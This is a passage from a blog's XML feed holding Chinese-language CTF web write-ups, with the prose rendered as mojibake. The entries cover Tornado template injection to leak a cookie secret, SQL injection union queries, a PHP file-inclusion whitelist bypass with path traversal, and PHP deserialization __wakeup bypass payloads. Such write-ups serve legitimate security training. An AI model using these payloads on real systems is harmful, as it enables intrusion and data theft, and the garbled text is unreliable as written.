alt="errormsg="></p><p>é€šè¿‡æŸ¥é˜…æ–‡æ¡£å‘çŽ°cookie_secretåœ¨Applicationå¯¹è±¡settingså±žæ€§ä¸­ï¼Œè¿˜å‘çŽ°self.application.settingsæœ‰ä¸€ä¸ªåˆ«å</p><p>handleræŒ‡å‘çš„å¤„ç†å½“å‰è¿™ä¸ªé¡µé¢çš„RequestHandlerå¯¹è±¡ï¼Œ  RequestHandler.settingsæŒ‡å‘self.application.settingsï¼Œ  å› æ­¤handler.settingsæŒ‡å‘RequestHandler.application.settingsã€‚<br> æž„é€ payloadèŽ·å–cookie_secret</p><pre><code>error?msg={{handler.settings}}</code></pre><p><img src="/2021/03/28/hu-wang-bei-2018-easytornado/cookie.png" alt="cookie"></p><p>åˆ©ç”¨è¿™ä¸ªè„šæœ¬è®¡ç®—å‡ºfilehashçš„å€¼</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> hashlibfilename <span class="token operator">=</span> <span class="token string">'/fllllllllllllag'</span>cookie_secret <span class="token operator">=</span><span class="token string">"789f66a0-648f-4006-a8e3-698a753015cf"</span><span class="token keyword">def</span> <span class="token function">getvalue</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">:</span>    md5 <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>    md5<span class="token punctuation">.</span>update<span class="token punctuation">(</span>string<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> md5<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">merge</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>getvalue<span class="token punctuation">(</span>cookie_secret <span class="token operator">+</span> getvalue<span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>merge<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>cookie_secret</p><pre><code>2e3ee5f8-f039-4130-b0c3-0a1d6ce7676c</code></pre><pre><code>728ec3dc0db938043d73b1028a911254</code></pre><pre><code>2e3ee5f8f0394130b0c30a1d6ce7676c</code></pre><pre><code>588a1b37df48f7f13e7febb5f4419049</code></pre><p>/fllllllllllllag</p><p>md5åŠ å¯†ä¸€æ¬¡ï¼š</p><pre><code>3bf9f6cf685a6dd8defadabfb41a03a1</code></pre><p>æ‹¼æŽ¥md5å†åŠ å¯†ä¸€æ¬¡</p><pre><code>file?filename=/fllllllllllllag&amp;filehash=8fae43e45895ca18bc7a29bb9c64b1d6</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> tornado </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTF:Web-NewsCenter</title>
      <link href="2021/03/27/xctf-web-newscenter/"/>
      <url>2021/03/27/xctf-web-newscenter/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/03/27/xctf-web-newscenter/blog/source_posts\XCTFï¼šWeb-NewsCenter\be3fd981eca3efc0534781b63e0e910.png" alt="be3fd981eca3efc0534781b63e0e910"></p><p>1â€™ and 1=1 #åˆ¤æ–­æœ‰æ— sqlæ³¨å…¥å‘çŽ°æœ‰</p><p>æŸ¥çœ‹åˆ—æ•°1â€™ order by 3 #</p><p>è”åˆæŸ¥è¯¢ 1â€™ union select 1,2,3 #</p><pre><code>1â€™ union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() #</code></pre><pre><code>1â€™ union select 1,group_concat(column_name),3 from  information_schema.columns where table_schema=database() and  table_name=â€˜secret_tableâ€™ #</code></pre><pre><code>â€™ union select 1,2,(select group_concat(id,0x3a,fl4g) from users) #</code></pre><pre><code>QCTF{sq1_inJec7ion_ezzz}</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>XCTF:Web-warmup</title>
      <link href="2021/03/24/xctf-web-warmup/"/>
      <url>2021/03/24/xctf-web-warmup/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/03/24/xctf-web-warmup/blog/source_posts\XCTFï¼šWeb-warmup\æ»‘ç¨½.png" alt="æ»‘ç¨½"></p><p>è®¿é—®ï¼š</p><pre><code>http://111.200.241.244:54849/source.php</code></pre><pre><code> &lt;?php    highlight_file(__FILE__);    class emmm    {        public static function checkFile(&amp;$page)        {            $whitelist = ["source"=&gt;"source.php","hint"=&gt;"hint.php"];            if (! isset($page) || !is_string($page)) {                echo "you can't see it";                return false;            }            if (in_array($page, $whitelist)) {                return true;            }            $_page = mb_substr(                $page,                0,                mb_strpos($page . '?', '?')            );            if (in_array($_page, $whitelist)) {                return true;            }            $_page = urldecode($page);            $_page = mb_substr(                $_page,                0,                mb_strpos($_page . '?', '?')            );            if (in_array($_page, $whitelist)) {                return true;            }            echo "you can't see it";            return false;        }    }    if (! empty($_REQUEST['file'])        &amp;&amp; is_string($_REQUEST['file'])        &amp;&amp; emmm::checkFile($_REQUEST['file'])    ) {        include $_REQUEST['file'];        exit;    } else {        echo "&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;";    }  ?&gt;</code></pre><p>è®¿é—®ï¼š</p><pre><code>hint.php</code></pre><p><img src="/2021/03/24/xctf-web-warmup/blog/source_posts\XCTFï¼šWeb-warmup\hint.php.png" alt="hint.php"></p><p>å‘çŽ°æ»¡è¶³ä¸‰ä¸ªæ¡ä»¶ï¼Œä¼šåŒ…å«å¹¶è¿è¡ŒæŒ‡å®šæ–‡ä»¶<code>file</code>ï¼Œæ­¤å¤„çš„<code>file</code>å¯ä»¥ç”±æˆ‘ä»¬æž„é€ ï¼Œä¸ºåˆ‡å…¥ç‚¹ï¼š</p><ol><li>æ£€æŸ¥<code>file</code>å˜é‡æ˜¯å¦ä¸ºç©º</li><li>æ£€æŸ¥<code>file</code>å˜é‡æ˜¯å¦ä¸ºå­—ç¬¦ä¸²</li><li>é€šè¿‡è‡ªå®šä¹‰çš„<code>checkFile</code>å‡½æ•°æ¥æ£€æŸ¥</li></ol><p>ç”±äºŽæˆ‘ä»¬è¦æž„é€ payloadï¼Œå‰ä¸¤ç‚¹ç›´æŽ¥æ»¡è¶³ï¼Œç›´æŽ¥æŸ¥çœ‹<code>checkFile</code>å‡½æ•°ä»£ç ï¼š</p><p>å‘çŽ°åŒ…å«å››ä¸ªifè¯­å¥ï¼š</p><pre><code>ç¬¬ä¸€ä¸ª if è¯­å¥å¯¹å˜é‡è¿›è¡Œæ£€éªŒï¼Œè¦æ±‚$pageä¸ºå­—ç¬¦ä¸²ï¼Œå¦åˆ™è¿”å›ž falseç¬¬äºŒä¸ª if è¯­å¥åˆ¤æ–­$pageæ˜¯å¦å­˜åœ¨äºŽ$whitelistæ•°ç»„ä¸­ï¼Œå­˜åœ¨åˆ™è¿”å›ž trueç¬¬ä¸‰ä¸ª if è¯­å¥ï¼Œæˆªå–ä¼ è¿›å‚æ•°ä¸­é¦–æ¬¡å‡ºçŽ°?ä¹‹å‰çš„éƒ¨åˆ†ï¼Œåˆ¤æ–­è¯¥éƒ¨åˆ†æ˜¯å¦å­˜åœ¨äºŽ$whitelistæ•°ç»„ä¸­ï¼Œï¼Œå­˜åœ¨åˆ™è¿”å›ž trueç¬¬å››ä¸ª if è¯­å¥ï¼Œå…ˆå¯¹æž„é€ çš„ payload è¿›è¡Œ url è§£ç ï¼Œå†æˆªå–ä¼ è¿›å‚æ•°ä¸­é¦–æ¬¡å‡ºçŽ°?ä¹‹å‰çš„éƒ¨åˆ†ï¼Œå¹¶åˆ¤æ–­è¯¥éƒ¨åˆ†æ˜¯å¦å­˜åœ¨äºŽ$whitelistä¸­ï¼Œå­˜åœ¨åˆ™è¿”å›ž true</code></pre><p>ä»¥ä¸Šå››ä¸ªæ»¡è¶³ä¸€ä¸ªå³å¯è¿”å›ž trueï¼Œè‹¥å‡æœªæ»¡è¶³ï¼Œåˆ™è¿”å›ž false<br>æˆ‘ä»¬åˆ©ç”¨ç¬¬ä¸‰ä¸ª if è¯­å¥æž„é€ å‚æ•°ï¼š</p><pre><code>?file=source.php?/../../../../ffffllllaaaagggg</code></pre><p> ç¬¬ä¸€ä¸ª<code>?</code>è¡¨ç¤ºä¼ å‚ï¼Œç¬¬äºŒä¸ª<code>?</code>ç”¨æ¥æ»¡è¶³æˆªå–</p><p> ç¬¬ä¸€ä¸ª<code>?</code>è¡¨ç¤ºä¼ å‚ï¼Œç¬¬äºŒä¸ª<code>?</code>ç”¨æ¥æ»¡è¶³æˆªå–</p><pre><code>flag{25e7bce6005c4e0c983fb97297ac6e5a} </code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>XCTF:Web2</title>
      <link href="2021/03/24/xctf-web2/"/>
      <url>2021/03/24/xctf-web2/</url>
      
        <content type="html"><![CDATA[<pre><code>&lt;?php$miwen="a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws";function encode($str){    $_o=strrev($str);    // echo $_o;    for($_0=0;$_0&lt;strlen($_o);$_0++){        $_c=substr($_o,$_0,1);        $__=ord($_c)+1;        $_c=chr($__);        $_=$_.$_c;       }     return str_rot13(strrev(base64_encode($_)));}highlight_file(__FILE__);/*   é€†å‘åŠ å¯†ç®—æ³•ï¼Œè§£å¯†$miwenå°±æ˜¯flag*/?&gt; </code></pre><p>åŠ å¯†æµç¨‹å¹¶ä¸å¤æ‚ï¼Œ</p><h5 id="å³-åè½¬å­—ç¬¦ä¸²-gt-æ¯ä¸ªå­—ç¬¦çš„ASCIIåŠ 1-gt-base64ç¼–ç -gt-åè½¬å­—ç¬¦ä¸²-gt-rot13ç¼–ç "><a href="#å³-åè½¬å­—ç¬¦ä¸²-gt-æ¯ä¸ªå­—ç¬¦çš„ASCIIåŠ 1-gt-base64ç¼–ç -gt-åè½¬å­—ç¬¦ä¸²-gt-rot13ç¼–ç " class="headerlink" title="å³:åè½¬å­—ç¬¦ä¸² => æ¯ä¸ªå­—ç¬¦çš„ASCIIåŠ 1 => base64ç¼–ç  => åè½¬å­—ç¬¦ä¸² => rot13ç¼–ç "></a>å³:åè½¬å­—ç¬¦ä¸² =&gt; æ¯ä¸ªå­—ç¬¦çš„ASCIIåŠ 1 =&gt; base64ç¼–ç  =&gt; åè½¬å­—ç¬¦ä¸² =&gt; rot13ç¼–ç </h5><p>æ‰€ä»¥è§£å¯†æµç¨‹åç€æ¥å°±è¡Œäº†ï¼Œ</p><h5 id="å³-rot13è§£ç -gt-åè½¬å­—ç¬¦ä¸²-gt-base64è§£ç -gt-æ¯ä¸ªå­—ç¬¦çš„ASCIIåŠ 1-gt-åè½¬å­—ç¬¦ä¸²"><a href="#å³-rot13è§£ç -gt-åè½¬å­—ç¬¦ä¸²-gt-base64è§£ç -gt-æ¯ä¸ªå­—ç¬¦çš„ASCIIåŠ 1-gt-åè½¬å­—ç¬¦ä¸²" class="headerlink" title="å³:rot13è§£ç  => åè½¬å­—ç¬¦ä¸² => base64è§£ç  => æ¯ä¸ªå­—ç¬¦çš„ASCIIåŠ 1 => åè½¬å­—ç¬¦ä¸²"></a>å³:rot13è§£ç  =&gt; åè½¬å­—ç¬¦ä¸² =&gt; base64è§£ç  =&gt; æ¯ä¸ªå­—ç¬¦çš„ASCIIåŠ 1 =&gt; åè½¬å­—ç¬¦ä¸²</h5><p>ï¼ˆå¯¹rot13ç¼–ç è¿‡çš„å­—ç¬¦ä¸²åœ¨è¿›è¡Œä¸€æ¬¡rot13ç¼–ç å³ä¸ºè§£ç ï¼‰</p><pre><code>&lt;?php//rot13è§£å¯†=&gt;å­—ç¬¦ä¸²åè½¬=&gt;base64è§£å¯†=&gt;æ¯ä¸ªå­—ç¬¦çš„ASCIIå‡1=&gt;åè½¬å­—ç¬¦ä¸²$miwen="a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws";function decode($str){    $_o = base64_decode(strrev(str_rot13($str)));    for($_0=0;$_0&lt;strlen($_o);$_0++){  //2.æ¯ä¸ªå­—ç¬¦ascii+1        $_c=substr($_o,$_0,1);         $__=ord($_c)-1;         $_c=chr($__);         $_=$_.$_c;        }      return strrev($_);}echo decode($miwen);?&gt;</code></pre><pre><code>flag:{NSCTF_b73d5adfb819c64603d7237fa0d52977} </code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>XCTF:Web-unserialize</title>
      <link href="2021/03/18/xctf-web-unserialize/"/>
      <url>2021/03/18/xctf-web-unserialize/</url>
      
        <content type="html"><![CDATA[<pre><code>&lt;?php class Demo {     private $file = 'index.php';    public function __construct($file) {         $this-&gt;file = $file;     }    function __destruct() {         echo @highlight_file($this-&gt;file, true);     }    function __wakeup() {         if ($this-&gt;file != 'index.php') {             //the secret is in the fl4g.php            $this-&gt;file = 'index.php';         }     } }if (isset($_GET['var'])) {     $var = base64_decode($_GET['var']);     if (preg_match('/[oc]:\d+:/i', $var)) {         die('stop hacking!');     } else {        @unserialize($var);     } } else {     highlight_file("index.php"); } ?&gt;</code></pre><p>ä¸»è¦å°±æ˜¯ç»•è¿‡ ä¸€ï¼š preg_match()     O:+4:â€Demoâ€:1:{s:10:â€Demofileâ€;s:8:â€fl4g.phpâ€;}</p><p>â€‹                        äºŒï¼š __wakeup()        O:+4:â€Demoâ€:2:{s:10:â€Demofileâ€;s:8:â€fl4g.phpâ€;}</p><pre><code>?var=TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>XCTF:Web-unserialize3</title>
      <link href="2021/03/18/xctf-web-unserialize3/"/>
      <url>2021/03/18/xctf-web-unserialize3/</url>
      
        <content type="html"><![CDATA[<pre><code>class xctf{public $flag = '111';public function __wakeup(){exit('bad requests');}?code=</code></pre><p><strong>å½“ åºåˆ—åŒ–çš„å­—ç¬¦ä¸²ä¸­çš„å±žæ€§å€¼ä¸ªæ•° å¤§äºŽ å±žæ€§ä¸ªæ•° å°±ä¼šå¯¼è‡´ååºåˆ—åŒ–å¼‚å¸¸ ä»Žè€Œè·³è¿‡ __wakeup()</strong></p><p>æž„é€ åºåˆ—åŒ–å­—ç¬¦ä¸²ï¼š</p><pre><code>&lt;?phpclass xctf{public $flag = "111";} $s = new xctf();echo(serialize($s));?&gt;</code></pre><p>echoï¼š</p><pre><code>O:4:"xctf":1:{s:4:"flag";s:3:"111";}</code></pre><p>æ”¹æˆ</p><pre><code>O:4:"xctf":2:{s:4:"flag";s:3:"111";}</code></pre><p>payloadï¼š</p><pre><code>?code=O:4:"xctf":2:{s:4:"flag";s:3:"111";}</code></pre><p>å¾—åˆ°ï¼š</p><pre><code>cyberpeace{f407c0868203e42205f96349e56c9bf5}</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP:åºåˆ—åŒ–ä¸Žååºåˆ—åŒ–</title>
      <link href="2021/03/18/php-xu-lie-hua-yu-fan-xu-lie-hua/"/>
      <url>2021/03/18/php-xu-lie-hua-yu-fan-xu-lie-hua/</url>
      
        <content type="html"><![CDATA[<h2 id="PHPåºåˆ—åŒ–ï¼šserialize"><a href="#PHPåºåˆ—åŒ–ï¼šserialize" class="headerlink" title="PHPåºåˆ—åŒ–ï¼šserialize"></a>PHPåºåˆ—åŒ–ï¼šserialize</h2><p>åºåˆ—åŒ–æ˜¯å°†å˜é‡æˆ–å¯¹è±¡è½¬æ¢æˆå­—ç¬¦ä¸²çš„è¿‡ç¨‹ã€‚<br>ä¸¾ä¾‹ï¼š</p><pre><code>&lt;?phpclass man{ public $name; public $age; public $height; function __construct($name,$age,$height){        //_constructï¼šåˆ›å»ºå¯¹è±¡æ—¶åˆå§‹åŒ–  $this-&gt;name = $name;  $this-&gt;age = $age;  $this-&gt;height = $height; }}$man=new man("Bob",5,20);var_dump(serialize($man));?&gt;</code></pre><p>è¾“å‡ºï¼š</p><pre><code>string(67) "O:3:"man":3:{s:4:"name";s:3:"Bob";s:3:"age";i:5;s:6:"height";i:20;}"</code></pre><h3 id="è§£é‡Šä¸€ä¸‹è¾“å‡ºç»“æžœï¼š"><a href="#è§£é‡Šä¸€ä¸‹è¾“å‡ºç»“æžœï¼š" class="headerlink" title="è§£é‡Šä¸€ä¸‹è¾“å‡ºç»“æžœï¼š"></a>è§£é‡Šä¸€ä¸‹è¾“å‡ºç»“æžœï¼š</h3><h5 id="O-ä»£è¡¨obeject-A-ä»£è¡¨æ•°ç»„"><a href="#O-ä»£è¡¨obeject-A-ä»£è¡¨æ•°ç»„" class="headerlink" title="O:ä»£è¡¨obeject/A:ä»£è¡¨æ•°ç»„"></a>O:ä»£è¡¨obeject/A:ä»£è¡¨æ•°ç»„</h5><h5 id="3-ä»£è¡¨å¯¹è±¡åå ä¸‰ä¸ªå­—ç¬¦"><a href="#3-ä»£è¡¨å¯¹è±¡åå ä¸‰ä¸ªå­—ç¬¦" class="headerlink" title="3:ä»£è¡¨å¯¹è±¡åå ä¸‰ä¸ªå­—ç¬¦"></a>3:ä»£è¡¨å¯¹è±¡åå ä¸‰ä¸ªå­—ç¬¦</h5><h5 id="ç¬¬äºŒä¸ª3-ä»£è¡¨å¯¹è±¡é‡Œæœ‰ä¸‰ä¸ªå˜é‡"><a href="#ç¬¬äºŒä¸ª3-ä»£è¡¨å¯¹è±¡é‡Œæœ‰ä¸‰ä¸ªå˜é‡" class="headerlink" title="ç¬¬äºŒä¸ª3:ä»£è¡¨å¯¹è±¡é‡Œæœ‰ä¸‰ä¸ªå˜é‡"></a>ç¬¬äºŒä¸ª3:ä»£è¡¨å¯¹è±¡é‡Œæœ‰ä¸‰ä¸ªå˜é‡</h5><h5 id="S-æ•°æ®ç±»åž‹-s-string-i-int"><a href="#S-æ•°æ®ç±»åž‹-s-string-i-int" class="headerlink" title="S:æ•°æ®ç±»åž‹ s:string/i:int"></a>S:æ•°æ®ç±»åž‹ s:string/i:int</h5><h5 id="4-ä»£è¡¨å˜é‡åçš„å­—ç¬¦é•¿åº¦"><a href="#4-ä»£è¡¨å˜é‡åçš„å­—ç¬¦é•¿åº¦" class="headerlink" title="4:ä»£è¡¨å˜é‡åçš„å­—ç¬¦é•¿åº¦"></a>4:ä»£è¡¨å˜é‡åçš„å­—ç¬¦é•¿åº¦</h5><pre><code>Object(O)ï¼š O:&lt;class_name_length&gt;:"&lt;class_name&gt;":&lt;number_of_properties&gt;:{&lt;properties&gt;}Booleanï¼ˆbï¼‰: b:value;(0æˆ–1)doubleï¼ˆdï¼‰integerï¼ˆiï¼‰: i:value;arrayï¼ˆaï¼‰ï¼š a:&lt;length&gt;:{key,keyvalue}stringï¼ˆsï¼‰: s:&lt;length&gt;:value;nullï¼ˆNï¼‰</code></pre><h2 id="PHPååºåˆ—åŒ–ï¼šunserialize"><a href="#PHPååºåˆ—åŒ–ï¼šunserialize" class="headerlink" title="PHPååºåˆ—åŒ–ï¼šunserialize"></a>PHPååºåˆ—åŒ–ï¼šunserialize</h2><p>ååºåˆ—åŒ–æ˜¯å°†å­—ç¬¦ä¸²è½¬æ¢æˆå˜é‡æˆ–å¯¹è±¡çš„è¿‡ç¨‹ã€‚<br>ä¸¾ä¾‹ï¼š</p><pre><code>&lt;?phpclass man{ public $name; public $age; public $height; function __construct($name,$age,$height){  $this-&gt;name = $name;  $this-&gt;age = $age;  $this-&gt;height = $height; }}$man= 'O:3:"man":3:{s:4:"name";s:3:"Bob";s:3:"age";i:5;s:6:"height";i:20;}';var_dump(unserialize($man));?&gt;</code></pre><p>è¾“å‡ºï¼š</p><pre><code>object(man)#1 (3) {  ["name"]=&gt;  string(3) "Bob"  ["age"]=&gt;  int(5)  ["height"]=&gt;  int(20)}</code></pre><h2 id="ååºåˆ—åŒ–æ¼æ´žï¼š"><a href="#ååºåˆ—åŒ–æ¼æ´žï¼š" class="headerlink" title="ååºåˆ—åŒ–æ¼æ´žï¼š"></a>ååºåˆ—åŒ–æ¼æ´žï¼š</h2><h4 id="ä¸¤ä¸ªæ¡ä»¶ï¼š"><a href="#ä¸¤ä¸ªæ¡ä»¶ï¼š" class="headerlink" title="ä¸¤ä¸ªæ¡ä»¶ï¼š"></a><strong>ä¸¤ä¸ªæ¡ä»¶ï¼š</strong></h4><ol><li><p>unserialize()å‡½æ•°çš„å‚æ•°å¯æŽ§</p></li><li><p>phpä¸­æœ‰å¯ä»¥åˆ©ç”¨çš„ç±»å¹¶ä¸”ç±»ä¸­æœ‰é­”å¹»å‡½æ•°</p><p>é­”å¹»å‡½æ•°ä¸€èˆ¬æ˜¯ä»¥__å¼€å¤´ï¼Œé€šå¸¸ä¼šå› ä¸ºæŸäº›æ¡ä»¶è€Œè§¦å‘ä¸ç”¨æˆ‘ä»¬æ‰‹åŠ¨è°ƒç”¨ï¼š</p></li></ol><h4 id="é­”å¹»å‡½æ•°ï¼š"><a href="#é­”å¹»å‡½æ•°ï¼š" class="headerlink" title="é­”å¹»å‡½æ•°ï¼š"></a><strong>é­”å¹»å‡½æ•°ï¼š</strong></h4><pre><code>_construct()ï¼šåˆ›å»ºå¯¹è±¡æ—¶åˆå§‹åŒ–/å½“ä¸€ä¸ªå¯¹è±¡åˆ›å»ºæ—¶è¢«è°ƒç”¨_destruction()ï¼šç»“æŸæ—¶é”€æ¯å¯¹è±¡/å½“ä¸€ä¸ªå¯¹è±¡é”€æ¯æ—¶è¢«è°ƒç”¨_toString()ï¼šå¯¹è±¡è¢«å½“ä½œå­—ç¬¦ä¸²æ—¶ä½¿ç”¨/å½“ä¸€ä¸ªå¯¹è±¡è¢«å½“ä½œä¸€ä¸ªå­—ç¬¦ä¸²ä½¿ç”¨_sleep()ï¼šåºåˆ—åŒ–å¯¹è±¡ä¹‹å‰è°ƒç”¨/åœ¨å¯¹è±¡åœ¨è¢«åºåˆ—åŒ–ä¹‹å‰è¿è¡Œ_wakeup()ï¼šååºåˆ—åŒ–ä¹‹å‰è°ƒç”¨/å°†åœ¨åºåˆ—åŒ–ä¹‹åŽç«‹å³è¢«è°ƒç”¨_call()ï¼šè°ƒç”¨å¯¹è±¡ä¸å­˜åœ¨æ—¶ä½¿ç”¨_get()ï¼šè°ƒç”¨ç§æœ‰å±žæ€§æ—¶ä½¿ç”¨</code></pre><h3 id="ä¾‹ä¸€ï¼š"><a href="#ä¾‹ä¸€ï¼š" class="headerlink" title="ä¾‹ä¸€ï¼š"></a>ä¾‹ä¸€ï¼š</h3><pre><code>&lt;?phpclass A{    var $test = "demo";    function __destruct(){            echo $this-&gt;test;    }}$a = $_GET['test'];$a_unser = unserialize($a);?&gt;</code></pre><p>è¿™é‡Œæˆ‘ä»¬åªè¦æž„é€ payloadï¼š</p><p><a href="http://127.0.0.1/test.php?test=O:1:">http://127.0.0.1/test.php?test=O:1:â€Aâ€:1:{s:4:â€testâ€;s:5:â€helloâ€;}</a></p><p>å°±èƒ½æŽ§åˆ¶echoå‡ºçš„å˜é‡ï¼Œæ¯”å¦‚ä½ èƒ½æ‹¿è¿™ä¸ªæ¥è¿›è¡Œåå°„åž‹xssã€‚ã€‚ã€‚</p><h3 id="ä¾‹äºŒï¼š"><a href="#ä¾‹äºŒï¼š" class="headerlink" title="ä¾‹äºŒï¼š"></a>ä¾‹äºŒï¼š</h3><p>index.php</p><pre><code>&lt;?phpclass SoFun{  public $file='index.php';  function __destruct(){    if(!empty($this-&gt;file)){      if(strchr($this-&gt; file,"\\")===false &amp;&amp;  strchr($this-&gt;file, '/')===false){        echo "&lt;br&gt;";        show_source(dirname (__FILE__).'/'.$this -&gt;file);}      else        die('Wrong filename.');      }    }  function __wakeup(){     $this-&gt; file='index.php';     }    public function __toString(){return '' ;}}  if (!isset($_GET['file'])){    show_source('index.php');  }   else  {     $file = $_GET['file'];     echo unserialize($file);   } ?&gt;  &lt;!--key in flag.php--&gt;</code></pre><p>flag.php</p><pre><code>&lt;?phpecho "key{you got it!!}"?&gt;</code></pre><p>ä»£ç å®¡è®¡ï¼š</p><p>1.ä»£ç æœ€åŽæç¤ºkeyåœ¨flag.phpé‡Œï¼Œå› æ­¤æˆ‘ä»¬è¦æƒ³åŠžæ³•è¯»é‡Œé¢çš„å†…å®¹ã€‚<br>2.åœ¨__destruct()é­”æœ¯æ–¹æ³•ä¸­ï¼Œshow_source(dirname (<strong>FILE</strong>).â€™/â€˜.$this -&gt;file)è¿™é‡Œæ˜¯è§£é¢˜çš„å…³é”®ï¼Œåœ¨ååºåˆ—åŒ–ä¹‹åŽä¼šè‡ªåŠ¨è°ƒç”¨__destructæ–¹æ³•ï¼Œå¯ä»¥åˆ©ç”¨è¿™ä¸ªå°†flag.phpçš„å†…å®¹è¯»å‡ºæ¥ã€‚<br>3.åœ¨__wakeup()é­”æœ¯æ–¹æ³•ä¸­ï¼Œåœ¨ååºåˆ—åŒ–åŽä¼šè‡ªåŠ¨è°ƒç”¨__wakeupæ–¹æ³•å¹¶å°†fileçš„å€¼ç½®ä¸ºindex.phpã€‚<br>4.æˆ‘ä»¬è¦æƒ³è¯»å‡ºflag.phpé‡Œçš„å†…å®¹éœ€è¦è°ƒç”¨__destructæ–¹æ³•è€Œç»•è¿‡__wakeupæ–¹æ³•ã€‚</p><p>è¿™é‡Œè¦ç”¨åˆ°CVE-2016-7124æ¼æ´žï¼šå½“åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­è¡¨ç¤ºå¯¹è±¡å±žæ€§ä¸ªæ•°çš„å€¼å¤§äºŽçœŸå®žçš„å±žæ€§ä¸ªæ•°æ—¶ä¼šè·³è¿‡__wakeupçš„æ‰§è¡Œ</p><h5 id="æž„é€ åºåˆ—åŒ–å¯¹è±¡ï¼šO-5-â€SoFunâ€-1-s-4-â€fileâ€-s-8-â€flag-phpâ€"><a href="#æž„é€ åºåˆ—åŒ–å¯¹è±¡ï¼šO-5-â€SoFunâ€-1-s-4-â€fileâ€-s-8-â€flag-phpâ€" class="headerlink" title="æž„é€ åºåˆ—åŒ–å¯¹è±¡ï¼šO:5:â€SoFunâ€:1:{s:4:â€fileâ€;s:8:â€flag.phpâ€;}"></a>æž„é€ åºåˆ—åŒ–å¯¹è±¡ï¼šO:5:â€SoFunâ€:1:{s:4:â€fileâ€;s:8:â€flag.phpâ€;}</h5><h5 id="æž„é€ ç»•è¿‡-wakeupï¼šO-5-â€SoFunâ€-2-s-4-â€fileâ€-s-8-â€flag-phpâ€"><a href="#æž„é€ ç»•è¿‡-wakeupï¼šO-5-â€SoFunâ€-2-s-4-â€fileâ€-s-8-â€flag-phpâ€" class="headerlink" title="æž„é€ ç»•è¿‡__wakeupï¼šO:5:â€SoFunâ€:2:{s:4:â€fileâ€;s:8:â€flag.phpâ€;}"></a>æž„é€ ç»•è¿‡__wakeupï¼šO:5:â€SoFunâ€:2:{s:4:â€fileâ€;s:8:â€flag.phpâ€;}</h5><h3 id="ä¾‹ä¸‰ï¼š"><a href="#ä¾‹ä¸‰ï¼š" class="headerlink" title="ä¾‹ä¸‰ï¼š"></a>ä¾‹ä¸‰ï¼š</h3><pre><code>&lt;?php     require_once('shield.php');    $x = new Shield();    isset($_GET['class']) &amp;&amp; $g = $_GET['class'];    if (!empty($g)) {        $x = unserialize($g);    }    echo $x-&gt;readfile();?&gt;</code></pre><p>å¯ä»¥çœ‹è§ å…ˆæ˜¯åŒ…å«äº†shield.php ç„¶åŽä»Žä¸­newäº†ä¸ªæ–°çš„å®žä¾‹å‡ºæ¥ æœ€åŽæŽ¥æ”¶ç”¨æˆ·çš„ååºåˆ—åŒ– è¾“å‡ºreadfile()æ–¹æ³•</p><p>è·Ÿè¿›ï¼š</p><pre><code>&lt;?php    //flag is in pctf.php    class Shield {        public $file;        function __construct($filename = '') {            $this -&gt; file = $filename;        }        function readfile() {            if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,'..')===FALSE              &amp;&amp; stripos($this-&gt;file,'/')===FALSE &amp;&amp; stripos($this-&gt;file,'\\')==FALSE) {                return @file_get_contents($this-&gt;file);            }        }    }?&gt;</code></pre><p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹è§åªè¦æ“æŽ§$fileè¿™ä¸ªå‚æ•°ä¸ºpctf.phpå°±å¯ä»¥äº†ï¼Œè¿™é‡Œconstructå‡½æ•°åœ¨å®žä¾‹è¢«åˆ›å»ºçš„æ—¶å€™(ä¹Ÿå°±æ˜¯new Shield()çš„æ—¶å€™)æ‰§è¡Œï¼Œæ‰€ä»¥ä¸ä¼šå½±å“æˆ‘ä»¬å¯¹$fileçš„æ“ä½œ</p><p>ç›´æŽ¥æž„é€ åºåˆ—åŒ–å¯¹è±¡ä¼ è¿‡åŽ» O:6:â€Shieldâ€:1:{s:4:â€fileâ€;s:8:â€pctf.phpâ€;} å°±è¡Œäº†</p><p>å‚è€ƒï¼š</p><p><a href="https://www.freebuf.com/articles/web/167721.html">https://www.freebuf.com/articles/web/167721.html</a></p><p><a href="https://blog.csdn.net/weixin_44677409/article/details/93884388">https://blog.csdn.net/weixin_44677409/article/details/93884388</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>XCTF:Web-supersqli</title>
      <link href="2021/03/17/xctf-web-supersqli/"/>
      <url>2021/03/17/xctf-web-supersqli/</url>
      
